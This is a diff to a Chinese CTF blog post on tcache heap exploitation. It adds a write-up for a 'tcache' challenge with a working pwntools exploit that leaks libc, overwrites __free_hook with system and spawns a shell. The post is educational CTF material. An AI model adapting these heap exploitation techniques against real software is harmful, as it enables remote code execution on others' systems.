@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1600269484702" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1600357588204" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1600269484702" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1600357588204" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [V&amp;N2020 公开赛]easyTHeap
+                                tcache attack
                             </h1>
                             
                                 <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-08-23</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">11.3
+                                    href="#">13.9
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">2537</a></span>
+                                    <span class="post-words">words:<a href="#">3085</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -197,8 +197,7 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>用这个题来总结一下tcache attack<br>
-关于tcache参考了这个师傅的博客：https://www.jianshu.com/p/9778331e1337</p>
+                            <p>关于tcache参考了这个师傅的博客：https://www.jianshu.com/p/9778331e1337</p>
 <h1 id="tcache">tcache</h1>
 <h2 id="tcache结构体">tcache结构体</h2>
 <p>Tcache机制是在libc-2.26中引入的一个新的堆管理机制。<br>
@@ -362,12 +361,13 @@ U2T（翻译君死了）
 U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也只看到过一次，主要是配合Off By One或Off By NULL的漏洞，使Unsortbin在合并过程中将中间的Tcachebin合并，从而达到修改fd字段的效果。
 </code></pre>
 <h1 id="题目">题目</h1>
-<h2 id="逆向">逆向</h2>
+<h2 id="vn2020-公开赛easytheap">[V&amp;N2020 公开赛]easyTHeap</h2>
+<h3 id="逆向">逆向</h3>
 <p>稍微逆一下就发现了delete的时候存在UAF漏洞<br>
 <img src="https://l3mon629.github.io/post-images/1598196191648.png" alt="" loading="lazy"><br>
 不过必须要注意的是，我们只能malloc 7次，free 3次<br>
 <img src="https://l3mon629.github.io/post-images/1598196245107.png" alt="" loading="lazy"></p>
-<h2 id="pwn-it">pwn it !!!</h2>
+<h3 id="pwn-it">pwn it !!!</h3>
 <p>这道题保护全开，所以我们可以攻击__malloc_hook<br>
 思路：<br>
 1，攻击__malloc_hook，必须要伪造chunk，我们可以利用tcache的特点，利用结构体污染，将tcache_perthread_struct的指针域改为__malloc_hook附近<br>
@@ -375,7 +375,7 @@ U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也�
 3，打one_gadget，必须要知道libc基地址，我们利用free态的结构体堆块（0x250会进入unsorted bin），泄漏main_arena上方的__malloc_hook拿到基地址<br>
 <img src="https://l3mon629.github.io/post-images/1598196903032.png" alt="" loading="lazy"><br>
 <img src="https://l3mon629.github.io/post-images/1598196908122.png" alt="" loading="lazy"></p>
-<h3 id="一种方法">一种方法</h3>
+<h4 id="一种方法">一种方法</h4>
 <p>唔……，本地只有2.28版本的libc，所以本地不可能打通，简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz</p>
 <p>exp:</p>
 <pre><code class="language-python">from pwn import *
@@ -461,7 +461,7 @@ add(0x20)
 
 p.interactive()
 </code></pre>
-<h3 id="另一种方法">另一种方法</h3>
+<h4 id="另一种方法">另一种方法</h4>
 <p>（似乎还有别的方法，我再想想还能不能用别的方法做出来（逃 ）<br>
 好像又找到了一种构造方式，本质思路没有变，细节稍微改动了一下，比如泄漏libc换成了0号chunk（哈哈哈</p>
 <pre><code class="language-python">from pwn import *
@@ -549,6 +549,95 @@ add(0x20)	#触发one_gadget
 
 p.interactive()
 </code></pre>
+<h2 id="tcache-2">tcache</h2>
+<h3 id="逆向-2">逆向</h3>
+<blockquote>
+<p>main函数<br>
+<img src="https://l3mon629.github.io/post-images/1600356727313.png" alt="" loading="lazy"><br>
+add函数，可以看到我们可以创建20个chunk，并且我们不能控制size，malloc的默认size是0x30<br>
+<img src="https://l3mon629.github.io/post-images/1600356785863.png" alt="" loading="lazy"><br>
+show函数<br>
+<img src="https://l3mon629.github.io/post-images/1600356750695.png" alt="" loading="lazy"><br>
+delete函数<br>
+<img src="https://l3mon629.github.io/post-images/1600356811307.png" alt="" loading="lazy"><br>
+edit函数，可以很轻易的发现漏洞点位于edit，我们能够编辑0x40大小的chunk，可以溢出到下一个chunk的size域<br>
+<img src="https://l3mon629.github.io/post-images/1600356836805.png" alt="" loading="lazy"></p>
+</blockquote>
+<blockquote>
+<p>思路：由于程序保护全开，我们必须要泄漏地址，考虑到我们能够申请较大数量的chunk，所以我们可以构造出一个较大size的unsorted bin绕过tcache bin，用来泄漏地址。但是我们必须得通过相关检查，后一个chunk必须完整，这一点经过调试可以构造出相关合理的size（通过溢出0x10字节）<br>
+泄漏完地址之后，我们可以打__free_hook，我们虽然没有UAF漏洞，但是我们可以利用unsorted bin构成一个类似于UAF的漏洞。因为我们之前构造出一个unsorted bin，在free之前记为1号chunk，我们可以malloc()一个块，这时这个块的id就为1，再malloc一个块，记为x，因为x在之前已经有指针了，记为x1，我们再次申请，就会从unsorted bin中给我们切下来一块，这个新指针记为x2，这样x1，x2都指向了同一个块，达成了一个“UAF”，我们free掉x1，编辑x2，就可以攻击成功。</p>
+</blockquote>
+<h3 id="exp">exp</h3>
+<p>exp:</p>
+<pre><code class="language-python">from pwn import *
+
+local = 1
+
+if local == 1:
+	p = process('./tcache')
+else:
+	p = remote('chall.pwnable.tw',10304)
+
+#elf = ELF('./bookwriter')
+libc = ELF('/glibc/2.28/64/lib/libc.so.6')
+
+def dbg():
+	context.log_level = 'debug'
+
+def add(content):
+	p.sendlineafter('4. Show String','1')
+	p.sendafter('Input your content:',content)
+
+def show(index):
+	p.sendlineafter('4. Show String','4')
+	p.sendafter('Select string:',str(index))
+
+def edit(index,content):
+	p.sendlineafter('4. Show String','2')
+	p.sendafter('Select string:',str(index))
+	p.sendafter('Input your content:',content)
+
+def delete(index):
+	p.sendlineafter('4. Show String','3')
+	p.sendafter('Select string:',str(index))
+
+
+for i in range(19):
+	add('A')
+
+payload = p64(0) * 7 + p64(0x441)
+edit(0,payload)
+
+delete(1)
+payload1 = 0x40 * b'A'
+edit(0,payload1)
+
+show(0)
+p.recvuntil(b'A' * 64)
+libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
+print(&quot;[*] libc_base --&gt; &quot;,hex(libc_base))
+
+__free_hook = libc_base + libc.sym['__free_hook']
+print(&quot;[*] __free_hook ---&gt; &quot;,hex(__free_hook))
+system_addr = libc_base + libc.sym['system']
+
+edit(0,payload)
+add('/bin/sh;')		#chunk1
+add('AAAAAAAA')		#chunk19   ==    chunk2
+
+
+
+delete(4)
+delete(2)
+
+edit(19,p64(__free_hook))
+
+add(p64(system_addr))
+add(p64(system_addr))
+
+delete(1)
+p.interactive()
+</code></pre>
 
                         </div>
                         
@@ -564,11 +653,21 @@ p.interactive()
 </li>
 <li><a href="#%E9%A2%98%E7%9B%AE">题目</a>
 <ul>
+<li><a href="#vn2020-%E5%85%AC%E5%BC%80%E8%B5%9Beasytheap">[V&amp;N2020 公开赛]easyTHeap</a>
+<ul>
 <li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
 <li><a href="#pwn-it">pwn it !!!</a>
 <ul>
 <li><a href="#%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95">一种方法</a></li>
 <li><a href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95">另一种方法</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#tcache-2">tcache</a>
+<ul>
+<li><a href="#%E9%80%86%E5%90%91-2">逆向</a></li>
+<li><a href="#exp">exp</a></li>
 </ul>
 </li>
 </ul>
@@ -604,8 +703,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=qzone&title=[V&amp;N2020 公开赛]easyTHeap&pics=https://l3mon629.github.io/images/avatar.png?v=1600269484702&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=weibo&title=[V&amp;N2020 公开赛]easyTHeap + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600269484702 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=qzone&title=tcache attack&pics=https://l3mon629.github.io/images/avatar.png?v=1600357588204&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=weibo&title=tcache attack + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600357588204 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -705,7 +804,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1600269484702);
+                    newDate.setTime(1600357588204);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
